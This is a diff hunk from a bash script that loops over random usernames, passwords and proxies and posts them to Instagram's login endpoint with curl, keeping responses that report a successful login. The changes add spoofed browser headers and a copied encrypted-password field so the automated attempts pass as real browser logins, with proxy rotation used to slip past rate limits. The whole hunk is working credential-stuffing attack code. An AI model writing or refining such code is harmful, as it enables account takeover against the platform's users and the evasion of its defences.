@@ -92,17 +92,14 @@ for i in $(seq 1 5); do
               random_proxy_index=$(get_random_number 1 "$proxy_count")
               random_proxy=$(sed -n "${random_proxy_index}p" "$proxy_file")
                echo "Selected proxy: $random_proxy"
-               # original code:
-               # execute_command "curl -x $random_proxy -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
-               # modified code:
-               execute_command "curl -x $random_proxy -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/"
+              
+               # Modified curl command with correct parameters
+                execute_command "curl -v -x $random_proxy -s -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\" -d \"enc_password=%23PWD_INSTAGRAM_BROWSER%3A10%3A1735433292%3AAUpQAB%2Fut0rt2EXX8wSYpehzy73Q1Nxh4ZlVtSVgZ3lCymhbujaWQcD1J%2BeX2IRmgQj35bPSCkOdrsF5rh9wrW70Kcd9O2i1t%2Blnmf1yierd3prRW545dx%2B8L3Re9HvLlDKajnDB12Smf4yrWw%3D%3D&caaF2DebugGroup=0&loginAttemptSubmissionCount=0&optIntoOneTap=false&queryParams=%7B%7D&trustedDeviceRecords=%7B%7D&username=$random_user\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true "
 
             else
                 echo "No proxy found or proxy file is empty, trying without proxy..."
-                 # original code:
-                 # execute_command "curl -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true  "
-                 # modified code:
-                execute_command "curl -s -d \"username=$random_user&password=$random_pass\" https://www.instagram.com/accounts/login/ajax/"
+                # Modified curl command without proxy
+                execute_command "curl -v -s -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\" -d \"enc_password=%23PWD_INSTAGRAM_BROWSER%3A10%3A1735433292%3AAUpQAB%2Fut0rt2EXX8wSYpehzy73Q1Nxh4ZlVtSVgZ3lCymhbujaWQcD1J%2BeX2IRmgQj35bPSCkOdrsF5rh9wrW70Kcd9O2i1t%2Blnmf1yierd3prRW545dx%2B8L3Re9HvLlDKajnDB12Smf4yrWw%3D%3D&caaF2DebugGroup=0&loginAttemptSubmissionCount=0&optIntoOneTap=false&queryParams=%7B%7D&trustedDeviceRecords=%7B%7D&username=$random_user\" https://www.instagram.com/accounts/login/ajax/  | grep \"authenticated\": true "
            fi
        else
            echo "Error: User or password not found for testing."
